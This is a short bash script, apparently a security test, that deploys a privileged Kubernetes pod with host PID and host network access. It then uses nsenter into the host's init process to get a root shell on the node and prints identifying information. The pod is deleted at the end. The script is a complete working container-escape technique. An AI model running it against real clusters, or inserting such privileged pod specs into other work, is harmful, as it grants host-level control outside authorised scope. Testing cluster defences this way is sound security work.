#!/bin/bash
echo "=== CONTAINER ESCAPE TEST (privileged pod) ==="
kubectl apply -f - <<'K8S'
apiVersion: v1
kind: Pod
metadata:
  name: bad-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: bad
    image: ubuntu:24.04
    command: ["sleep","300"]
    securityContext:
      privileged: true
K8S
kubectl wait --for=condition=Ready pod/bad-pod --timeout=60s
kubectl exec -it bad-pod -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'whoami && hostname && cat /etc/os-release | head -3'
kubectl delete pod bad-pod --force --grace-period=0
echo "=== COMPLETE ==="
